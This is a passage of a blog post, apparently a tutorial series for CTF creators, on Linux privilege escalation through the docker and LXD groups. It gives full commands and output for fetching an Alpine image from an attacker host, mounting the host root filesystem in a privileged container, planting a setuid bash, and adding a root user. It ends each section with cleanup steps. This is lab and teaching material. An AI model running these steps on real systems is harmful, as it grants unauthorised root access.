+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,120<span class="o">(</span>lpadmin<span class="o">)</span>,132<span class="o">(</span>lxd<span class="o">)</span>,133<span class="o">(</span>sambashare<span class="o">)</span>,134<span class="o">(</span>docker<span class="o">)</span>
+</span></span><span class="line"><span class="cl">bash-5.0# <span class="nb">exit</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Alternatively, escalate with the new root user and the previously generated password:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~$ su - toor
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl"><span class="c1"># id</span>
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># exit</span>
+</span></span><span class="line"><span class="cl">user@pwn:~$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Remove the toor user from <code>/etc/passwd</code> and remove the bash suid bit binary:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># vim /etc/passwd</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># rm /home/user/bash</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Remove the current user from the docker group:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo gpasswd -d user docker
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Reboot the system to apply the change:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">reboot
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-lxd-group">Privilege Escalation via LXD Group</h1>
+<p>The <code>LXD</code> group can be used to manage <code>LXD</code> containers. We&rsquo;ll install <code>LXD</code> and add the current user to the <code>LXD</code> group:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt install lxd <span class="o">&amp;&amp;</span> sudo usermod -aG lxd user <span class="o">&amp;&amp;</span> reboot
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In the adversary host, clone the Alpine repo:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/saghul/lxd-alpine-builder.git
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Navigate to the directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> lxd-alpine-builder
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then build the container image:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ./build-alpine
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Setup a python3 HTTP service:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo python3 -m http.server <span class="m">80</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Transfer the file to the victim system:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget 10.10.10.11/alpine-vx.xx-xxxxxxxxxxxxxxxxxxx.tar.gz
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now on the victim system we&rsquo;ll initialize LXD:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~$ lxd init
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Would we like to use LXD clustering? <span class="o">(</span>yes/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>no<span class="o">]</span>: Do we want to configure a new storage pool? <span class="o">(</span>yes/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>yes<span class="o">]</span>: 
+</span></span><span class="line"><span class="cl">Name of the new storage pool <span class="o">[</span><span class="nv">default</span><span class="o">=</span>default<span class="o">]</span>: 
+</span></span><span class="line"><span class="cl">Name of the storage backend to use <span class="o">(</span>ceph, btrfs, dir, lvm, zfs<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>zfs<span class="o">]</span>: 
+</span></span><span class="line"><span class="cl">Create a new ZFS pool? <span class="o">(</span>yes/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>yes<span class="o">]</span>: 
+</span></span><span class="line"><span class="cl">Would we like to use an existing empty block device <span class="o">(</span>e.g. a disk or partition<span class="o">)</span>? <span class="o">(</span>yes/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>no<span class="o">]</span>: 
+</span></span><span class="line"><span class="cl">Size in GB of the new loop device <span class="o">(</span>1GB minimum<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>5GB<span class="o">]</span>: 
+</span></span><span class="line"><span class="cl">Would we like to connect to a MAAS server? <span class="o">(</span>yes/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>no<span class="o">]</span>: 
+</span></span><span class="line"><span class="cl">Would we like to create a new <span class="nb">local</span> network bridge? <span class="o">(</span>yes/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>yes<span class="o">]</span>: 
+</span></span><span class="line"><span class="cl">What should the new bridge be called? <span class="o">[</span><span class="nv">default</span><span class="o">=</span>lxdbr0<span class="o">]</span>: 
+</span></span><span class="line"><span class="cl">What IPv4 address should be used? <span class="o">(</span>CIDR subnet notation, “auto” or “none”<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>auto<span class="o">]</span>: 
+</span></span><span class="line"><span class="cl">What IPv6 address should be used? <span class="o">(</span>CIDR subnet notation, “auto” or “none”<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>auto<span class="o">]</span>: 
+</span></span><span class="line"><span class="cl">Would we like the LXD server to be available over the network? <span class="o">(</span>yes/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>no<span class="o">]</span>: 
+</span></span><span class="line"><span class="cl">Would we like stale cached images to be updated automatically? <span class="o">(</span>yes/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>yes<span class="o">]</span> 
+</span></span><span class="line"><span class="cl">Would we like a YAML <span class="s2">&#34;lxd init&#34;</span> preseed to be printed? <span class="o">(</span>yes/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>no<span class="o">]</span>: 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We&rsquo;ll then import the LXD image:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~$ lxc image import ./alpine-vx.xx-xxxxxxxxxxxxxxxx.gz --alias privesc
+</span></span><span class="line"><span class="cl">To start your first instance, try: lxc launch ubuntu:20.04
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Image imported with fingerprint: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If we have <code>UID=0</code> on the container then is going to match <code>UID=0</code> on the host:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~$ lxc init privesc privesc-container -c security.privileged<span class="o">=</span><span class="nb">true</span>
+</span></span><span class="line"><span class="cl">Creating privesc-container
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After the container is created, we&rsquo;ll list the container:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~$ lxc list                     
+</span></span><span class="line"><span class="cl">+-------------------+---------+------+------+-----------+-----------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span>       NAME        <span class="p">|</span>  STATE  <span class="p">|</span> IPV4 <span class="p">|</span> IPV6 <span class="p">|</span>   TYPE    <span class="p">|</span> SNAPSHOTS <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-------------------+---------+------+------+-----------+-----------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> privesc-container <span class="p">|</span> STOPPED <span class="p">|</span>      <span class="p">|</span>      <span class="p">|</span> CONTAINER <span class="p">|</span> <span class="m">0</span>         <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-------------------+---------+------+------+-----------+-----------+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then we&rsquo;ll mount the host root file system to the <code>/mnt</code> directory in the container:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~$ lxc config device add privesc-container mydevice disk <span class="nv">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>
+</span></span><span class="line"><span class="cl">Device mydevice added to privesc-container
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Start the container with the  following:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~$ lxc start privesc-container
+</span></span><span class="line"><span class="cl">user@pwn:~$ lxc list
+</span></span><span class="line"><span class="cl">+-------------------+---------+--------------------+-----------------------------------------------+-----------+-----------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span>       NAME        <span class="p">|</span>  STATE  <span class="p">|</span>        IPV4        <span class="p">|</span>                     IPV6                      <span class="p">|</span>   TYPE    <span class="p">|</span> SNAPSHOTS <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-------------------+---------+--------------------+-----------------------------------------------+-----------+-----------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> privesc-container <span class="p">|</span> RUNNING <span class="p">|</span> 10.94.36.82 <span class="o">(</span>eth0<span class="o">)</span> <span class="p">|</span> fd42:647f:f795:fddf:216:3eff:fea3:bf33 <span class="o">(</span>eth0<span class="o">)</span> <span class="p">|</span> CONTAINER <span class="p">|</span> <span class="m">0</span>         <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-------------------+---------+--------------------+-----------------------------------------------+-----------+-----------+
+</span></span><span class="line"><span class="cl">user@pwn:~$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Execute the container and spawn a bash shell as root:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~$ lxc <span class="nb">exec</span> privesc-container /bin/bash
+</span></span><span class="line"><span class="cl">~ <span class="c1"># id</span>
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">~ <span class="c1"># hostname</span>
+</span></span><span class="line"><span class="cl">privesc-container
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Create a copy of bash and add an SUID bit to the bash executable:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">~ <span class="c1"># cp /mnt/root/usr/bin/bash /mnt/root/home/user/bash</span>
+</span></span><span class="line"><span class="cl">~ <span class="c1"># chmod u+s /mnt/root/home/user/bash</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Exit from the container and escalate to the root user:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/mnt/root <span class="c1"># exit</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Escalate privileges using the SUID bit in the bash binary by passing the <code>-p</code> flag:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ /home/user/bash -p
+</span></span><span class="line"><span class="cl">bash-5.0# whoami
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">bash-5.0# hostname
+</span></span><span class="line"><span class="cl">ubuntu
+</span></span><span class="line"><span class="cl">bash-5.0# <span class="nb">exit</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Remove the current user from the root group:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo gpasswd -d user lxd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Reboot the system to apply the change:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">reboot
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-12-28</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/privilege-escalation/">Privilege Escalation</a>,&nbsp;<a href="/tags/groups/">Groups</a>,&nbsp;<a href="/tags/docker-group/">Docker Group</a>,&nbsp;<a href="/tags/lxd-group/">Lxd Group</a>,&nbsp;<a href="/tags/sudo-group/">Sudo Group</a>,&nbsp;<a href="/tags/video-group/">Video Group</a>,&nbsp;<a href="/tags/disk-group/">Disk Group</a>,&nbsp;<a href="/tags/shadow-group/">Shadow Group</a>,&nbsp;<a href="/tags/pkexec/">Pkexec</a>,&nbsp;<a href="/tags/wheel-group/">Wheel Group</a>,&nbsp;<a href="/tags/defend/">Defend</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/linux-privesc-nfs-root-squashing/" class="prev" rel="prev" title="Linux Privilege Escalation - NFS Root Squashing for CTF Creators"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Linux Privilege Escalation - NFS Root Squashing for CTF Creators</a>
+            <a href="/linux-privesc-cron-jobs/" class="next" rel="next" title="Linux Privilege Escalation - Cron Jobs for CTF Creators">Linux Privilege Escalation - Cron Jobs for CTF Creators<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.138.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":-1},"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
